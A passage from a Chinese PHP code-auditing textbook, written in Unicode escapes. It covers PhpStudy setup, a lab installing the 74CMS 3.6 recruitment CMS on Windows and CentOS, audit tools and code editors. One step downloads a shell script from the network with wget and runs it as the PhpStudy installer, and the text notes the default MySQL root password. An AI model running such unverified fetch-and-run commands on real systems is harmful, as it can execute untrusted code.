\u57FA\u4E8E\u4EE5\u4E0A\u539F\u5219\uFF0C\u672C\u4E66\u4F7F\u7528PhpStudy\u5DE5\u5177\u8FDB\u884C\u96C6\u6210\u73AF\u5883\u642D\u5EFA\uFF0C\u4ECE\u800C\u7B80\u5316\u73AF\u5883\u642D\u5EFA\u8FC7\u7A0B\uFF0C\u5C06\u91CD\u70B9\u66F4\u4FA7\u91CD\u4E8E\u6F0F\u6D1E\u4EE3\u7801\u5BA1\u8BA1\u7684\u6280\u80FD\uFF0C\u672C\u8282\u5C06\u4ECB\u7ECD\u4EE3\u7801\u5BA1\u8BA1\u73AF\u5883\u642D\u5EFA\u65B9\u6CD5\u3002\r
\r
### 1.2.1 PhpStudy\u73AF\u5883\u4ECB\u7ECD\r
\r
PhpStudy\u662F\u4E00\u6B3EPHP\u8C03\u8BD5\u73AF\u5883\u7684\u7A0B\u5E8F\u96C6\u6210\u5305\u3002\u4F7F\u7528PhpStudy\u642D\u5EFA\u73AF\u5883\u53EF\u4EE5\u5B9E\u73B0\u4E00\u6B21\u6027\u5B89\u88C5\u3001\u65E0\u987B\u914D\u7F6E\u3001\u65B9\u4FBFPHP\u8C03\u8BD5\u73AF\u5883\u3002\u8BE5\u5DE5\u5177\u652F\u6301Windows\u3001Linux\u3001Mac\u4E09\u79CD\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u76EE\u524D\u6700\u65B0\u7248\u672C\u4E3APhpStudyV8\u3002\u4E0EPhpStudy\u96C6\u6210\u73AF\u5883\u7C7B\u4F3C\u7684\u5DE5\u5177\u6709\uFF1AXAMPP\u3001APPServer\u3001WampServer\u7B49\u3002\u672C\u5C0F\u8282\u4EE5PhpStudy2018\u4E3A\u4F8B\uFF0C\u5BF9\u8BE5\u5DE5\u5177\u5E38\u7528\u529F\u80FD\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
1.\u670D\u52A1\u63A7\u5236\r
\r
PhpStudy\u4E3B\u754C\u9762\u5982\u56FE1-3\u6240\u793A\uFF0C\u8BE5\u5DE5\u5177\u9ED8\u8BA4\u63D0\u4F9B\u4E86Apache\u4E0EMySQL\u4E24\u79CD\u670D\u52A1\uFF0C\u53EF\u901A\u8FC7\u70B9\u51FB\u754C\u9762\u4E2D\u201C\u542F\u52A8|\u505C\u6B62|\u91CD\u542F\u201D\u6309\u94AE\u63A7\u5236\u670D\u52A1\u72B6\u6001\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)\r
\r
\u56FE1-3 PhpStudy\u4E3B\u754C\u9762\r
\r
2.PhpStudy\u652F\u6301\u7684\u8F6F\u4EF6\u7248\u672C\r
\r
PhpStudy\u7A0B\u5E8F\u5305\u96C6\u6210\u4E86\u5F88\u591AWeb\u5E94\u7528\u73AF\u5883\uFF0C\u5305\u62EC\uFF1A\r
\r
l Web\u5E94\u7528\u4E2D\u95F4\u4EF6\u90E8\u5206\u5305\u62EC\uFF1AIIS\u3001Apache\u3001Nginx\uFF1B\r
\r
l \u6570\u636E\u5E93\u5305\u62EC\uFF1AMySQL\uFF1B\r
\r
l PHP\u8BED\u8A00\u7248\u672C\uFF1Aphp7\u3001php6\u3001php5\u7B49\u7248\u672C\u3002\r
\r
  \u5F53\u5728PhpStudy\u4E3B\u754C\u9762\u70B9\u51FB\u201C\u5207\u6362\u7248\u672C\u201D \u6309\u94AE\uFF0C\u5C06\u663E\u793APhpStudy2018\u652F\u6301\u670D\u52A1\u7684\u4E0D\u540C\u7248\u672C\uFF0C\u5982\u56FE1-4\u6240\u793A\u3002\u7528\u6237\u53EF\u6839\u636E\u4E0D\u540C\u7684\u5BA1\u8BA1\u9700\u6C42\u9009\u62E9\u5408\u9002\u7684\u7248\u672C\u642D\u914D\u4ECE\u800C\u66F4\u65B9\u4FBF\u7684\u5207\u6362\u5B9E\u9A8C\u73AF\u5883\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)\r
\r
\u56FE1-4 PhpStudy\u652F\u6301\u7248\u672C\r
\r
3.MySQL\u6570\u636E\u5E93\u7BA1\u7406\r
\r
  PhpStudy\u4E2DMySQL\u6570\u636E\u5E93\u9ED8\u8BA4\u4F7F\u7528\u7684\u7BA1\u7406\u5458\u5BC6\u7801\u5747\u4E3A\u201Croot\u201D\uFF0C\u7528\u6237\u53EF\u901A\u8FC7\u201C\u5176\u4ED6\u9009\u9879\u201D->\u201CMySQL\u5DE5\u5177\u201D->\u201C\u8BBE\u7F6E\u6216\u4FEE\u6539\u5BC6\u7801\u201D\u5BF9\u6570\u636E\u5E93\u7BA1\u7406\u5458\u5BC6\u7801\u8FDB\u884C\u4FEE\u6539\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)\r
\r
\u56FE1-5 \u4FEE\u6539MySQL\u5BC6\u7801\u56FE\r
\r
PhpStudy\u8FD8\u652F\u6301\u591A\u79CD\u6570\u636E\u5E93\u7BA1\u7406\u5DE5\u5177\uFF0C\u5305\u62EC\uFF1AMySQL-Front\u3001phpMyAdmin\u3002\u7528\u6237\u53EF\u901A\u8FC7\u70B9\u51FB\u4E0A\u8FF0\u5DE5\u5177\u8FDE\u63A5\u672C\u673A\u6570\u636E\u5E93\uFF0C\u56FE1-6\u7ED9\u51FAMySQL-Front\u4F7F\u7528\u754C\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)\r
\r
\u56FE1-6 MySQL-Front\u7BA1\u7406\u5DE5\u5177\r
\r
  \u9664\u4E0A\u8FF0\u4ECB\u7ECD\u529F\u80FD\u5916\uFF0CPhpStudy\u5177\u6709\u7684\u529F\u80FD\u8FD8\u5305\u62EC\uFF1A\u7AD9\u70B9\u57DF\u540D\u7BA1\u7406\u3001\u73AF\u5883\u7AEF\u53E3\u68C0\u6D4B\u3001\u914D\u7F6E\u6587\u4EF6\u4FEE\u6539\u3001\u7F51\u7AD9\u6839\u76EE\u5F55\u7B49\u3002\r
\r
### 1.2.2 \u5B9E\u9A8C\uFF1AWindows\u4E0ELinux\u642D\u5EFA74CMS\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u6B21\u5B9E\u9A8C\u5C06\u5728Windows\u53CALinux\u7CFB\u7EDF\u4E0B\u4F7F\u7528PhpStudy\u96C6\u6210\u73AF\u5883\u642D\u5EFA74CMS3.6\u4EBA\u624D\u7BA1\u7406\u7CFB\u7EDF\u3002\u503C\u5F97\u6CE8\u610F\uFF1ACMS\u7F51\u7AD9\u6709\u5F88\u591A\u7C7B\u578B\uFF0C\u4F8B\u5982\uFF1A74CMS\u3001BlueCMS\u3001ZZCMS\u7B49\u3002\u4E0D\u540C\u7684CMS\u642D\u5EFA\u65B9\u6CD5\u4E5F\u5B58\u5728\u5DEE\u5F02\uFF0C\u672C\u8282\u4EE574CMS\u4E3A\u6848\u4F8B\u8FDB\u884C\u642D\u5EFA\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80031.2.1\u8282\uFF1APhpStudy\u73AF\u5883\u4ECB\u7ECD\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u4F7F\u7528PhpStudy\u642D\u5EFA74CMS\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BCentos7\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS3.6\u5B89\u88C5\u5305\uFF1BPhpStudy2018\u5B89\u88C5\u5305Windows\u4E0ELinux\u7248\u672C\uFF08PHP5.0\u7248\u672C\u53CA\u4EE5\u4E0A\u3001MySQL5.0\u7248\u672C\u53CA\u4EE5\u4E0A\uFF09\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\u7B2C\u4E00\u90E8\u5206\uFF1AWindows\u642D\u5EFA74CMS\r
\r
\uFF081\uFF09\u5B89\u88C5PhpStudy\u5E76\u542F\u52A8Apache\u4E0EMySQL\u3002\u89E3\u538BPhpStudy2018\u5B89\u88C5\u5305\uFF0C\u7136\u540E\u53CC\u51FB\u201CPhpStudy.exe\u201D\u3002\u70B9\u51FB\u201C\u542F\u52A8\u201D\u6309\u94AE\u5F00\u542FApache\u4E0EMySQL\u670D\u52A1\uFF0CApache\u670D\u52A1\u9ED8\u8BA4\u5F00\u542F\u5728\u672C\u673A\u768480\u7AEF\u53E3\u63D0\u4F9BHTTP\u670D\u52A1\uFF0CMySQL\u670D\u52A1\u9ED8\u8BA4\u5F00\u542F\u5728\u672C\u673A\u76843306\u7AEF\u53E3\u542C\u6570\u636E\u5E93\u670D\u52A1\u3002\u70B9\u51FB\u201C\u505C\u6B62\u201D\u53EF\u4EE5\u5C06\u4E24\u4E2A\u670D\u52A1\u5173\u95ED\uFF0C\u5982\u56FE1-7\u6240\u793A\u3002\u6CE8\u610F\uFF1A\u5982\u679CApache\u6216MySQL\u670D\u52A1\u542F\u52A8\u5931\u8D25\uFF0C\u5F88\u6709\u53EF\u80FD\u662F\u7AEF\u53E380\u62163306\u88AB\u5360\u7528\u5BFC\u81F4\u7684\u670D\u52A1\u542F\u52A8\u5931\u8D25\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)\r
\r
\u56FE1-7 PhpStudy\u542F\u52A8\u505C\u6B62\u56FE\r
\r
\uFF082\uFF09\u70B9\u51FB\u201C\u5176\u4ED6\u9009\u9879\u83DC\u5355\u201D\u627E\u5230\u201C\u7F51\u7AD9\u6839\u76EE\u5F55\u201D\u6253\u5F00PhpStudy\u9ED8\u8BA4\u63D0\u4F9B\u7684\u7F51\u7AD9\u8DEF\u5F84\uFF0C\u672C\u4E66\u4E2D\u8DEF\u5F84\u4E3A\u201CC:\\PhpStudy\\PHPTutorial\\WWW\u201D\uFF0C\u5982\u56FE1-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)\r
\r
\u56FE1-8 \u7F51\u7AD9\u6839\u8DEF\u5F84\u56FE\r
\r
\uFF083\uFF09\u5C06\u672C\u5B9E\u9A8C\u63D0\u4F9B74CMS\u6587\u4EF6\u4E2D\u7684upload\u6587\u4EF6\u5939\u62F7\u8D1D\u5230\u7F51\u7AD9\u6839\u8DEF\u5F84\u3002\u5728\u6D4F\u89C8\u5668\u4E2D\u8F93\u5165\u201Chttp://\u4E3B\u673AIP\u5730\u5740/\u5B89\u88C5\u76EE\u5F55/install\u201D\u3002\u82E5\u8BBF\u95EE\u6210\u529F\u5219\u663E\u793A\u5982\u4E0B\u754C\u9762\u3002\u6839\u636E\u5B89\u88C5\u5411\u5BFC\u81EA\u884C\u8FDB\u884C\u5B89\u88C5\uFF0C\u5728\u5B89\u88C5\u8FC7\u7A0B\u4E2D\u9700\u586B\u5199\u6570\u636E\u5E93\u7528\u6237\u540D\u53CA\u5BC6\u7801\uFF08\u4E0EPhpStudy\u5BF9\u5E94\uFF09\u3001\u81EA\u5B9A\u4E49\u6570\u636E\u5E93\u540D\u79F0\u3001\u7BA1\u7406\u5458\u7528\u6237\u540D\u5BC6\u7801\u7B49\u3002\u5B89\u88C5\u8FC7\u7A0B\u5982\u4E0B\u56FE1-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif)\r
\r
\u56FE1-9 \u7F51\u7AD9\u5B89\u88C5\u8FC7\u7A0B\u7B80\u6613\u56FE\r
\r
\uFF084\uFF09\u5411\u5BFC\u5B89\u88C5\u540E\uFF0C\u82E5\u663E\u793A\u201C\u5DF2\u6210\u529F\u5B89\u88C5\u9A91\u58EBCMS\u201D\u5B57\u6837\u5219\u6210\u529F\u5B89\u88C5\uFF0C\u5982\u56FE1-10\u6240\u793A\u3002\u70B9\u51FB\u201C\u7F51\u7AD9\u9996\u9875\u201D\u6D4F\u89C8\u7F51\u7AD9\u5B89\u88C5\u540E\u7ED3\u679C\uFF0C\u540C\u65F6\u4E5F\u53EF\u70B9\u51FB\u201C\u7F51\u7AD9\u540E\u53F0\u201D\u8F93\u5165\u7528\u6237\u540D\u5BC6\u7801\u767B\u9646\u540E\u53F0\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg)\r
\r
\u56FE1-10 \u7F51\u7AD9\u5B89\u88C5\u6210\u529F\u56FE\r
\r
\u7B2C\u4E8C\u90E8\u5206\uFF1ACentos7\u642D\u5EFA74CMS\r
\r
\uFF081\uFF09  \u5728Linux\u64CD\u4F5C\u7CFB\u7EDF\u4E0B\u4F7F\u7528\u547D\u4EE4\u4E3A\uFF1A\r
\r
\r
\r
yum install -y wget\r
\r
wget -O install.sh https://notdocker.xp.cn/install.sh\r
\r
sh install.sh\r
\r
\r
\r
\u4E0B\u8F7DPhpStudy\u7684\u975Edocker\u7248\u672C\u8FDB\u884C\u5B89\u88C5\u3002\u5B89\u88C5\u6210\u529F\u540E\uFF0C\u754C\u9762\u663E\u793A\u6D4F\u89C8\u5668\u8BBF\u95EE\u5730\u5740\u53CA\u7CFB\u7EDF\u767B\u5F55\u7684\u8D26\u53F7\u53CA\u5BC6\u7801\uFF0C\u5982\u56FE1-11\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg)\r
\r
\u56FE1-11 PhpStudy\u5B89\u88C5\u6210\u529F\u56FE\r
\r
\uFF082\uFF09\u5728\u6D4F\u89C8\u5668\u4E2D\u8F93\u5165\u201Chttp://192.168.6.154:9080/4EC69D\u201D\u5E76\u8F93\u5165\u7528\u6237\u540D\u767B\u5F55\u8FDB\u884C\u767B\u5F55\uFF0C\u901A\u8FC7\u9009\u9879\u5361\u201C\u9996\u9875\u201D\u5173\u95EDnginx\u5E76\u542F\u52A8apache2.4.39\u3002\u70B9\u51FB\u201C\u6570\u636E\u5E93\u201D\u9009\u9879\u5361\uFF0C\u5B89\u88C5MySQL5.7.27\u7248\u672C\uFF0C\u5982\u56FE1-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg)\r
\r
\u56FE1-12 PhpStudy\u914D\u7F6E\u56FE\r
\r
\uFF083\uFF09\u901A\u8FC7\u4E0A\u8FF0\u7BA1\u7406\u754C\u9762\u53EF\u67E5\u770BWeb\u6839\u8DEF\u5F84\u4E3A\u201C[/www/admin/localhost_80/wwwroot](javascript:;)\u201D\uFF0C\u5728\u8BE5\u8DEF\u5F84\u4E0B\u4F7F\u7528\u547D\u4EE4\u201Cecho hello > index.php\u201D\uFF0C\u7136\u540E\u4F7F\u7528\u6D4F\u89C8\u5668\u8BBF\u95EE\u201Chttp://\u4E3B\u673AIP/index.php\u201D\u663E\u793A\u9875\u9762\uFF0C\u5219\u8BF4\u660E\u7F51\u7AD9\u642D\u5EFA\u6210\u529F\uFF0C\u5982\u56FE1-13\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg)\r
\r
\u56FE1-13 index\u9875\u9762\u6D4F\u89C8\u56FE\r
\r
## 1.3  \u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u6982\u8981\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u4E3A\u4FDD\u8BC1\u5BA1\u8BA1\u4EE3\u7801\u7684\u5B8C\u6574\u6027\u4E0E\u51C6\u786E\u6027\uFF0C\u6211\u4EEC\u901A\u5E38\u9700\u8981\u4F7F\u7528\u81EA\u52A8\u5316\u4EE3\u7801\u5BA1\u8BA1\u4E0E\u4EBA\u5DE5\u5BA1\u8BA1\u76F8\u7ED3\u5408\u7684\u65B9\u5F0F\uFF0C\u4E0D\u540C\u7684\u5BA1\u8BA1\u65B9\u5F0F\u4E5F\u5C06\u4F7F\u7528\u5404\u79CD\u5404\u6837\u7684\u5BA1\u8BA1\u5DE5\u5177\u6765\u63D0\u5347\u5DE5\u4F5C\u6548\u7387\uFF0C\u4E0B\u9762\u5BF9\u81EA\u52A8\u5BA1\u8BA1\u53CA\u4EBA\u5DE5\u5BA1\u8BA1\u4F7F\u7528\u7684\u5DE5\u5177\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09\u81EA\u52A8\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
\u81EA\u52A8\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u53EF\u5FEB\u901F\u7684\u626B\u63CF\u7A0B\u5E8F\u4E2D\u7684\u5E38\u89C4\u6F0F\u6D1E\uFF0C\u5E76\u8FDB\u884C\u9A8C\u8BC1\u5206\u6790\u3002\u6B64\u7C7B\u5DE5\u5177\u7684\u4F7F\u7528\u5728\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u63D0\u5347\u4E86\u4EE3\u7801\u5BA1\u8BA1\u7684\u6548\u7387\u3002\r
\r
\u4F46\u662F\u81EA\u52A8\u5BA1\u8BA1\u5DE5\u5177\u7684\u7F3A\u70B9\u4E5F\u5F88\u660E\u663E\u3002\u81EA\u52A8\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u53EA\u80FD\u6839\u636E\u9759\u6001\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\u5E38\u89C4\u6F0F\u6D1E\u3002\u800C\u5BF9\u4E8E\u4EE3\u7801\u903B\u8F91\uFF0C\u4E1A\u52A1\u903B\u8F91\u7C7B\u578B\u7684\u6F0F\u6D1E\u5374\u5F88\u96BE\u53D1\u73B0\u3002\u540C\u65F6\uFF0C\u81EA\u52A8\u5BA1\u8BA1\u5DE5\u5177\u7684\u626B\u63CF\u7ED3\u679C\u4E5F\u5B58\u5728\u4E00\u5B9A\u7684\u8BEF\u62A5\u7387\uFF0C\u800C\u8BEF\u62A5\u7387\u8FC7\u9AD8\u5219\u4F1A\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u589E\u52A0\u5BA1\u8BA1\u7684\u5DE5\u4F5C\u91CF\u3002\r
\r
\u6839\u636E\u4EE3\u7801\u8BED\u8A00\u7684\u4E0D\u540C\u5F80\u5F80\u4F7F\u7528\u7684\u5BA1\u8BA1\u5DE5\u5177\u4E5F\u4E0D\u540C\uFF0CPHP\u3001Java\u3001Python\u90FD\u5B58\u5728\u5F88\u591A\u5F00\u6E90\u7684\u81EA\u52A8\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\u672C\u5355\u5143\u5219\u4E3B\u8981\u4ECB\u7ECDPHP\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\uFF0C\u5305\u62EC\uFF1ASeay\u3001RIPS\u3001VCG\u7B49\u3002\r
\r
\uFF082\uFF09\u4EBA\u5DE5\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
\u4EBA\u5DE5\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5F80\u5F80\u4F1A\u4F7F\u7528\u52A8\u6001\u8C03\u8BD5\u4E0E\u5BA1\u8BA1\u5C0F\u5DE5\u5177\u76F8\u7ED3\u5408\u7684\u65B9\u5F0F\u3002\u5F88\u591A\u7A0B\u5E8F\u5728\u8BBE\u8BA1\u4E4B\u521D\u90FD\u4F1A\u8003\u8651\u5E38\u89C1\u5B89\u5168\u6F0F\u6D1E\u95EE\u9898\uFF0C\u5C24\u5176\u5BF9\u4E8E\u7528\u6237\u4F20\u5165\u7684\u6570\u636E\u90FD\u4F1A\u7ECF\u8FC7\u4E25\u683C\u7684\u8FC7\u6EE4\u7B5B\u9009\u4E0E\u7F16\u7801\u52A0\u5BC6\u3002\u9488\u5BF9\u6570\u636E\u6D41\u64CD\u4F5C\u7684\u4E0D\u540C\u65B9\u5F0F\uFF0C\u4E00\u822C\u4F1A\u5C06\u5BA1\u8BA1\u5DE5\u5177\u5206\u4E3A\u4EE5\u4E0B\u51E0\u7C7B\uFF1A\r
\r
l \u5BF9\u6570\u636E\u8FDB\u884C\u7F16\u7801\u53CA\u52A0\u5BC6\uFF1A\u52A0\u89E3\u5BC6\u7F16\u7801\u89E3\u7801\u5DE5\u5177\uFF1B\r
\r
l \u5BF9\u6570\u636E\u8FDB\u884C\u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D\uFF1A\u6B63\u5219\u8868\u8FBE\u5F0F\u6D4B\u8BD5\u5DE5\u5177\uFF1B\r
\r
\u4EBA\u5DE5\u5206\u6790\u5229\u7528\u6F0F\u6D1E\u7684EXP\u9700\u8981\u7684\u5DE5\u5177\uFF1A\r
\r
l \u6D4B\u8BD5EXP\uFF1A\u6570\u636E\u5305\u6293\u5305\u5206\u6790\u5DE5\u5177\uFF1B\r
\r
l SQL\u6CE8\u5165\u6F0F\u6D1E\u6D4B\u8BD5\uFF1A\u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u5DE5\u5177\u3002\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u7684\u4F7F\u7528\u53EF\u4EE5\u66F4\u65B9\u4FBF\u7684\u6D4B\u8BD5\u7A0B\u5E8F\u4E2D\u5404\u79CD\u529F\u80FD\u6F0F\u6D1E\u3002\r
\r
## 1.4 \u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\r
\r
\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u662F\u4EE3\u7801\u5BA1\u8BA1\u7684\u5FC5\u5907\u5DE5\u5177\uFF0C\u987A\u624B\u7684\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u53EF\u4EE5\u66F4\u65B9\u4FBF\u7684\u67E5\u770B\u4EE3\u7801\u3001\u8C03\u8BD5\u529F\u80FD\u3001\u67E5\u627E\u5185\u5BB9\u7B49\u3002\u800C\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u53D1\u5C55\u81F3\u4ECA\u4E5F\u591A\u79CD\u591A\u6837\uFF0C\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\u9009\u62E9\u9002\u5408\u7684\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u5F80\u5F80\u53EF\u4EE5\u8FBE\u5230\u4E8B\u534A\u529F\u500D\u7684\u6548\u679C\u3002\r
\r
\u4E00\u822C\u5C06\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u5206\u4E3A\u4E24\u7C7B\uFF1A\u8F7B\u91CF\u7EA7\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u3001\u96C6\u6210\u5F00\u53D1\u5DE5\u5177IDE\u3002\r
\r
l \u8F7B\u91CF\u7EA7\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\r
\r
\u5E38\u7528\u7684\u8F7B\u91CF\u7EA7\u4EE3\u7801\u7F16\u8F91\u5DE5\u5177\u5305\u62EC\uFF1ASublime Text\u3001Notepad++\u3001Editplus\u3001UltraEdit\u7B49\u3002\u6B64\u7C7B\u5DE5\u5177\u666E\u904D\u90FD\u652F\u6301\u7F16\u7A0B\u8BED\u8A00\u9AD8\u4EAE\uFF0C\u5168\u5C40\u641C\u7D22\u7B49\u7279\u70B9\u3002\u7531\u4E8E\u5176\u542F\u52A8\u5FEB\u5BF9\u6587\u672C\u64CD\u4F5C\u65B9\u4FBF\uFF0C\u56E0\u6B64\u5176\u9002\u7528\u4E8E\u5BA1\u8BA1\u4EE3\u7801\u91CF\u5C0F\u7684PHP\u6587\u4EF6\u3002\r
\r
l \u96C6\u6210\u5F00\u53D1\u5DE5\u5177\r
\r
\u5E38\u7528\u7684\u96C6\u6210\u5F00\u53D1\u5DE5\u5177\u5305\u62EC\uFF1AVisual Studio Code\uFF08VS Code\uFF09\u3001Zend Studio\u3001PhpStorm\u3001PhpDesigner\u7B49\uFF0C\u6B64\u7C7B\u5DE5\u5177\u8BBE\u8BA1\u4E4B\u521D\u4E3A\u4E86\u7A0B\u5E8F\u5F00\u53D1\u4FBF\u6377\u6027\uFF0C\u56E0\u6B64\u5176\u5177\u6709\u7684\u529F\u80FD\u975E\u5E38\u5168\u9762\u3002\u6B64\u7C7B\u5DE5\u5177\u5E38\u89C1\u7684\u7279\u70B9\u5305\u62EC\uFF1A\u652F\u6301\u4E0D\u540C\u8BED\u8A00\u9AD8\u4EAE\u3001\u5BF9\u4EE3\u7801\u8FDB\u884C\u672C\u5730\u53CA\u8FDC\u7A0B\u8C03\u8BD5\u529F\u80FD\u3001\u81EA\u52A8\u626B\u63CF\u4EE3\u7801\u8BED\u6CD5\u9519\u8BEF\u7B49\uFF0C\u4F46\u662F\u529F\u80FD\u7684\u5168\u9762\u4E5F\u5BFC\u81F4\u7684\u6B64\u7C7B\u5DE5\u5177\u542F\u52A8\u8F83\u6162\u4E14\u5B89\u88C5\u56F0\u96BE\u3002\u56E0\u6B64\u6B64\u7C7B\u5DE5\u5177\u66F4\u9002\u7528\u4E8E\u5BA1\u8BA1\u5F00\u6E90\u6846\u67B6\u7A0B\u5E8F\uFF0C\u5927\u578BCMS\u7B49\u590D\u6742\u7A0B\u5E8F\u3002\r
\r
\u672C\u8282\u4ECB\u7ECD\u4E09\u6B3E\u9002\u7528\u4E8EPHP\u4EE3\u7801\u7684\u7F16\u8F91\u5DE5\u5177\uFF1ASublime\u3001VS Code\u3001PhpStorm\u3002\r
\r
\uFF081\uFF09Sublime Text\r
\r
Sublime Text\u662F\u4E00\u6B3E\u8DE8\u5E73\u53F0\u4E14\u8BC6\u522B\u591A\u79CD\u8BED\u8A00\u7684\u6587\u4EF6\u7F16\u8F91\u5668\uFF0CSublime Text\u652F\u6301\u5B89\u88C5\u5728MacOS\u3001Linux\u3001Windows\u5E73\u53F0\u4E0A\uFF0C\u4F7F\u7528\u5DE5\u5177\u53EF\u4EE5\u7F16\u8F91HTML\u3001CSS\u3001JavaScript\u3001PHP\u7B49\u5E94\u7528\u7A0B\u5E8F\u3002\u56E0\u4E3A\u5176\u4F53\u79EF\u5C0F\u3001\u6269\u5C55\u6027\u5F3A\u3001\u6253\u5F00\u6587\u672C\u901F\u5EA6\u5FEB\u7B49\u4F18\u70B9\uFF0C\u76EE\u524D\u5DF2\u7ECF\u88AB\u5F88\u591A\u8BA1\u7B97\u673A\u9886\u57DF\u5DE5\u4F5C\u8005\u4F7F\u7528\u3002\u5F53\u4EE3\u7801\u5BA1\u8BA1\u91CF\u6BD4\u8F83\u5C0F\u65F6\uFF0C\u901A\u5E38\u5EFA\u8BAE\u76F4\u63A5\u4F7F\u7528Sublime Text\u67E5\u770B\u4EE3\u7801\u3002\u4E0B\u9762\u5BF9\u8BE5\u5DE5\u5177\u7279\u70B9\u8FDB\u884C\u4ECB\u7ECD\uFF1A\r
\r
l \u652F\u6301\u591A\u79CD\u7F16\u7801\u683C\u5F0F\r
\r
Sublime Text\u652F\u6301\u5B57\u7B26\u7F16\u7801\u5305\u62EC\uFF1AISO8859\u3001UTF-8\u3001GBK\u3001GB2312\u7B49\uFF0C\u7528\u6237\u53EF\u901A\u8FC7\u201CFile\u201D->\u201CReopen with Encoding\u201D\u9009\u9879\u5361\u8BBE\u7F6E\u7F16\u7801\u5B57\u7B26\u96C6\u89E3\u51B3\u4E71\u7801\u95EE\u9898\u3002\u5982\u56FE1-14\u6240\u793A\u3002\r
\r
l \u652F\u6301\u5916\u6302\u63D2\u4EF6\r
\r
Sublime Text\u62E5\u6709\u5F3A\u5927\u7684\u8BFE\u53EF\u6269\u5C55\u6027\uFF0C\u7528\u6237\u53EF\u6839\u636E\u81EA\u5DF1\u7684\u9700\u8981\u5B89\u88C5\u4E0D\u540C\u7684\u63D2\u4EF6\uFF0C\u4F8B\u5982\uFF1AFileDiffs\uFF08\u6587\u4EF6\u6BD4\u8F83\uFF09\u3001MarkDown Editing\uFF08\u67E5\u770B\u548C\u7F16\u8F91MarkDown\u6587\u4EF6\uFF09\u3001Alignment\uFF08\u4EE3\u7801\u81EA\u52A8\u5BF9\u9F50\uFF09\u3001Git\uFF08\u5C06Git\u8BE5\u5DE5\u5177\u4E2D\uFF09\u7B49\u3002\u7528\u6237\u53EF\u901A\u8FC7\u70B9\u51FB\u201CPreferences\u201D\u4E2D\u201CPackage Control\u201D\u6309\u94AE\u8FDB\u884C\u63D2\u4EF6\u7684\u641C\u7D22\uFF0C\u5982\u56FE1-15\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg)\r
\r
\u56FE1-14 Sublime Text\u8BBE\u7F6E\u7F16\u7801\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg)\r
\r
\u56FE1-15 Sublime\u63D2\u4EF6\u56FE\r
\r
\uFF082\uFF09VS Code\r
\r
